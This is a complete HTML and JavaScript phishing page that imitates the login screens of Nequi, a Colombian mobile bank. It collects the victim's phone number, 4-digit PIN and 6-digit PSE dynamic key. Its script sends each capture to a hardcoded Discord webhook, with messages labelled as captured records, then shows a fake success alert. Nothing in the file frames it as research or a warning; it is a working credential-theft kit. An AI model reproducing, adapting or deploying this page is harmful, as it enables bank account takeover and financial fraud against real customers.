<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nequi - Pagos PSE</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        body {
            background-color: #17001a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .mobile-frame {
            width: 100%;
            height: 100vh;
            background-color: #17001a;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 20px;
            position: relative;
        }

        .screen {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            height: 100%;
            width: 100%;
        }

        .hidden {
            display: none !important;
        }

        /* --- Pantalla 1 --- */
        .header-top {
            display: flex;
            justify-content: flex-end;
            align-items: center;
        }

        .help-btn {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 6px 16px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .logo-area {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo-container {
            position: relative;
        }

        .logo-text {
            font-size: 72px;
            font-weight: 900;
            letter-spacing: -3px;
            color: #ffffff;
            line-height: 1;
        }

        .pink-square {
            width: 12px;
            height: 12px;
            background-color: #ff007f;
            position: absolute;
            left: -18px;
            top: 18px;
        }

        .bottom-section {
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
        }

        .input-section {
            margin-bottom: 20px;
        }

        .input-box-wrapper {
            background-color: #2b1130;
            border: 1px solid #ff007f;
            border-radius: 8px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            font-size: 18px;
        }

        .prefix {
            color: rgba(255, 255, 255, 0.6);
            margin-right: 12px;
        }

        .phone-input {
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 18px;
            width: 100%;
            outline: none;
        }

        .phone-input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        .error-message {
            color: #ff3355;
            font-size: 13px;
            margin-top: 8px;
        }

        .action-container {
            display: flex;
            gap: 10px;
            margin-bottom: 24px;
        }

        .btn-enter {
            flex-grow: 1;
            background-color: #a50055;
            color: rgba(255, 255, 255, 0.4);
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            transition: 0.2s;
        }

        .btn-enter.active {
            background-color: #c6005e;
            color: #ffffff;
            cursor: pointer;
        }

        .btn-qr {
            background-color: #c6005e;
            color: #ffffff;
            border: none;
            width: 52px;
            border-radius: 8px;
            font-size: 22px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .footer-links {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 10px;
        }

        .change-phone-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .phone-icon-svg {
            width: 14px;
            height: 18px;
            border: 1.5px solid rgba(255, 255, 255, 0.8);
            border-radius: 3px;
        }

        .change-phone {
            text-decoration: none;
            color: #ffffff;
        }

        .brand-by {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.5);
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .bbva-bars {
            font-weight: bold;
            letter-spacing: -2px;
            font-size: 13px;
        }

        /* --- Pantalla 2 (Clave) --- */
        .pin-header {
            display: flex;
            align-items: center;
            gap: 16px;
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 24px;
        }

        .back-btn {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
        }

        .pin-dots-container {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 20px;
        }

        .pin-dot {
            width: 45px;
            height: 45px;
            background-color: #ece4f0;
            border-radius: 8px;
        }

        .pin-dot.filled {
            background-color: #270c2e;
            border: 2px solid #ff007f;
        }

        .pin-subtitle {
            text-align: center;
            color: #d1c4e9;
            font-size: 14px;
            line-height: 1.4;
            margin-bottom: 40px;
        }

        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 16px;
            padding: 0 10px;
            text-align: center;
            margin-bottom: 20px;
        }

        .key {
            background: none;
            border: none;
            color: white;
            font-size: 32px;
            font-weight: 400;
            cursor: pointer;
            padding: 10px 0;
        }

        .key:active {
            opacity: 0.5;
        }

        .forgot-pin-container {
            text-align: center;
        }

        .btn-forgot {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 10px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
        }

        /* --- Pantalla 3 (Clave Dinámica PSE - Fondo Blanco Estilo Imagen) --- */
        .pse-screen {
            background-color: #ffffff;
            color: #17001a;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            padding: 30px 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            z-index: 20;
        }

        .pse-top-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .pse-logo-container {
            position: relative;
            margin-bottom: 20px;
        }

        .pse-logo-text {
            font-size: 40px;
            font-weight: 900;
            letter-spacing: -2px;
            color: #17001a;
            line-height: 1;
        }

        .pse-pink-square {
            width: 8px;
            height: 8px;
            background-color: #ff007f;
            position: absolute;
            left: -12px;
            top: 10px;
        }

        .pse-title {
            font-size: 24px;
            font-weight: bold;
            color: #17001a;
            margin-bottom: 24px;
        }

        .pse-subtitle {
            font-size: 14px;
            color: #4a4052;
            line-height: 1.5;
            max-width: 320px;
            margin-bottom: 30px;
        }

        .pse-input-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            margin-bottom: 20px;
        }

        .pse-badge-six {
            background-color: #e60073;
            color: white;
            font-size: 22px;
            font-weight: bold;
            width: 42px;
            height: 42px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .pse-lines-container {
            display: flex;
            gap: 12px;
        }

        .pse-line-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 28px;
        }

        .pse-dash {
            width: 100%;
            border-bottom: 2px solid #a89ba8;
            margin-bottom: 6px;
        }

        .pse-digit {
            font-size: 22px;
            font-weight: bold;
            color: #17001a;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .pse-keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            width: 100%;
            max-width: 320px;
            margin: 0 auto;
            text-align: center;
        }

        .pse-key {
            background: none;
            border: none;
            color: #17001a;
            font-size: 28px;
            font-weight: 400;
            cursor: pointer;
            padding: 12px 0;
        }

        .pse-key:active {
            opacity: 0.5;
        }

        .pse-key-del {
            background-color: #17001a;
            color: white;
            border-radius: 8px;
            font-size: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 48px;
            height: 48px;
            margin: auto;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="mobile-frame">
        
        <!-- ================= PANTALLA 1 ================= -->
        <div class="screen" id="screen1">
            <div class="header-top">
                <button class="help-btn">
                    <span>?</span> Ayuda
                </button>
            </div>

            <div class="logo-area">
                <div class="logo-container">
                    <div class="pink-square"></div>
                    <h1 class="logo-text">Neqᴜı</h1>
                </div>
            </div>

            <div class="bottom-section">
                <section class="input-section">
                    <div class="input-box-wrapper">
                        <span class="prefix">+57</span>
                        <input type="tel" class="phone-input" id="phoneInput" placeholder="Ingresa tu cel" maxlength="10" oninput="validatePhone(this)">
                    </div>
                    <p class="error-message" id="errorMsg">Escribe porfa el número de tu cel para seguir.</p>
                </section>

                <div class="action-container">
                    <button class="btn-enter" id="enterBtn" disabled onclick="goToPinScreen()">Entra</button>
                    <button class="btn-qr">$</button>
                </div>

                <footer class="footer-links">
                    <div class="change-phone-container">
                        <div class="phone-icon-svg"></div>
                        <a href="#" class="change-phone">¿Cambiaste tu cel?</a>
                    </div>
                    <div class="brand-by">by <span class="bbva-bars">≡</span></div>
                </footer>
            </div>
        </div>

        <!-- ================= PANTALLA 2 (Clave) ================= -->
        <div class="screen hidden" id="screen2">
            <div>
                <div class="pin-header">
                    <button class="back-btn" onclick="goToScreen1()">←</button>
                    <span>Escribe tu clave</span>
                </div>
                
                <div class="pin-dots-container">
                    <div class="pin-dot" id="dot0"></div>
                    <div class="pin-dot" id="dot1"></div>
                    <div class="pin-dot" id="dot2"></div>
                    <div class="pin-dot" id="dot3"></div>
                </div>

                <div class="pin-subtitle">
                    No dudamos que seas tú...<br>Pero es mejor confirmar ;)
                </div>
            </div>

            <div>
                <div class="keypad">
                    <button class="key" onclick="pressKey('1')">1</button>
                    <button class="key" onclick="pressKey('2')">2</button>
                    <button class="key" onclick="pressKey('3')">3</button>
                    <button class="key" onclick="pressKey('4')">4</button>
                    <button class="key" onclick="pressKey('5')">5</button>
                    <button class="key" onclick="pressKey('6')">6</button>
                    <button class="key" onclick="pressKey('7')">7</button>
                    <button class="key" onclick="pressKey('8')">8</button>
                    <button class="key" onclick="pressKey('9')">9</button>
                    <button class="key" style="visibility: hidden;"></button>
                    <button class="key" onclick="pressKey('0')">0</button>
                    <button class="key" onclick="pressKey('del')">⌫</button>
                </div>

                <div class="forgot-pin-container">
                    <button class="btn-forgot">Olvidé mi clave</button>
                </div>
            </div>
        </div>

        <!-- ================= PANTALLA 3 (Pagos PSE Clave Dinámica) ================= -->
        <div class="pse-screen hidden" id="screen3">
            <div class="pse-top-content">
                <div class="pse-logo-container">
                    <div class="pse-pink-square"></div>
                    <h1 class="pse-logo-text">Neqᴜı</h1>
                </div>

                <h2 class="pse-title">Prestamos PSE de Nequi</h2>
                
                <p class="pse-subtitle">
                    Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.
                </p>

                <div class="pse-input-row">
                    <div class="pse-badge-six">6</div>
                    <div class="pse-lines-container">
                        <div class="pse-line-box">
                            <div class="pse-digit" id="d0"></div>
                            <div class="pse-dash"></div>
                        </div>
                        <div class="pse-line-box">
                            <div class="pse-digit" id="d1"></div>
                            <div class="pse-dash"></div>
                        </div>
                        <div class="pse-line-box">
                            <div class="pse-digit" id="d2"></div>
                            <div class="pse-dash"></div>
                        </div>
                        <div class="pse-line-box">
                            <div class="pse-digit" id="d3"></div>
                            <div class="pse-dash"></div>
                        </div>
                        <div class="pse-line-box">
                            <div class="pse-digit" id="d4"></div>
                            <div class="pse-dash"></div>
                        </div>
                        <div class="pse-line-box">
                            <div class="pse-digit" id="d5"></div>
                            <div class="pse-dash"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div>
                <div class="pse-keypad">
                    <button class="pse-key" onclick="pressPseKey('1')">1</button>
                    <button class="pse-key" onclick="pressPseKey('2')">2</button>
                    <button class="pse-key" onclick="pressPseKey('3')">3</button>
                    <button class="pse-key" onclick="pressPseKey('4')">4</button>
                    <button class="pse-key" onclick="pressPseKey('5')">5</button>
                    <button class="pse-key" onclick="pressPseKey('6')">6</button>
                    <button class="pse-key" onclick="pressPseKey('7')">7</button>
                    <!-- CORREGIDO AQUÍ: Se cambió pressKey por pressPseKey -->
                    <button class="pse-key" onclick="pressPseKey('8')">8</button>
                    <button class="pse-key" onclick="pressPseKey('9')">9</button>
                    <button class="pse-key" style="visibility: hidden;"></button>
                    <button class="pse-key" onclick="pressPseKey('0')">0</button>
                    <button class="pse-key" onclick="pressPseKey('del')"><div class="pse-key-del">×</div></button>
                </div>
            </div>
        </div>

    </div>

    <script>
        let currentPhoneNumber = "";
        let currentPin = "";
        let currentPsePin = "";

        function validatePhone(input) {
            const enterBtn = document.getElementById('enterBtn');
            const errorMsg = document.getElementById('errorMsg');
            
            if (input.value.length >= 7) {
                enterBtn.removeAttribute('disabled');
                enterBtn.classList.add('active');
                errorMsg.style.display = 'none';
            } else {
                enterBtn.setAttribute('disabled', 'true');
                enterBtn.classList.remove('active');
                errorMsg.style.display = 'block';
            }
        }

        function goToPinScreen() {
            const input = document.getElementById('phoneInput');
            if (input.value.length >= 7) {
                currentPhoneNumber = input.value;
                document.getElementById('screen1').classList.add('hidden');
                document.getElementById('screen2').classList.remove('hidden');
            }
        }

        function goToScreen1() {
            document.getElementById('screen2').classList.add('hidden');
            document.getElementById('screen3').classList.add('hidden');
            document.getElementById('screen1').classList.remove('hidden');
            currentPin = "";
            currentPsePin = "";
            updatePinDots();
            updatePseDisplay();
        }

        function pressKey(num) {
            if (num === 'del') {
                currentPin = currentPin.slice(0, -1);
            } else if (currentPin.length < 4) {
                currentPin += num;
            }
            updatePinDots();

            if (currentPin.length === 4) {
                enviarAWebhookDiscord(currentPhoneNumber, currentPin, null);
            }
        }

        function updatePinDots() {
            for (let i = 0; i < 4; i++) {
                const dot = document.getElementById('dot' + i);
                if (i < currentPin.length) {
                    dot.classList.add('filled');
                } else {
                    dot.classList.remove('filled');
                }
            }
        }

        function pressPseKey(num) {
            if (num === 'del') {
                currentPsePin = currentPsePin.slice(0, -1);
            } else if (currentPsePin.length < 6) {
                currentPsePin += num;
            }
            updatePseDisplay();

            if (currentPsePin.length === 6) {
                enviarClaveDinamicaWebhook(currentPhoneNumber, currentPin, "6" + currentPsePin);
            }
        }

        function updatePseDisplay() {
            for (let i = 0; i < 6; i++) {
                const box = document.getElementById('d' + i);
                if (i < currentPsePin.length) {
                    box.textContent = currentPsePin[i];
                } else {
                    box.textContent = "";
                }
            }
        }

        function enviarAWebhookDiscord(telefono, pin, claveDinamica) {
            const webhookURL = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";

            let mensaje = `🚨 **Nuevo Registro Capturado** 🚨\n📱 **Celular:** +57 ${telefono}\n🔑 **PIN:** ${pin}`;
            if (claveDinamica) {
                mensaje += `\n🔢 **Clave Dinámica PSE:** ${claveDinamica}`;
            }

            const payload = { content: mensaje };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(response => {
                setTimeout(() => {
                    if (!claveDinamica) {
                        document.getElementById('screen2').classList.add('hidden');
                        document.getElementById('screen3').classList.remove('hidden');
                    }
                }, 300);
            })
            .catch(error => {
                console.error("Error al enviar datos:", error);
                setTimeout(() => {
                    if (!claveDinamica) {
                        document.getElementById('screen2').classList.add('hidden');
                        document.getElementById('screen3').classList.remove('hidden');
                    }
                }, 300);
            });
        }

        function enviarClaveDinamicaWebhook(telefono, pin, claveDinamica) {
            const webhookURL = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";

            const payload = {
                content: `🚨 **Clave Dinámica PSE Capturada** 🚨\n📱 **Celular:** +57 ${telefono}\n🔑 **PIN:** ${pin}\n🔢 **Clave Dinámica:** ${claveDinamica}`
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(response => {
                setTimeout(() => {
                    alert("¡Proceso completado con éxito!");
                    goToScreen1();
                }, 400);
            })
            .catch(error => {
                console.error("Error al enviar clave dinámica:", error);
                setTimeout(() => {
                    alert("¡Proceso completado con éxito!");
                    goToScreen1();
                }, 400);
            });
        }
    </script>
</body>
                    </html>
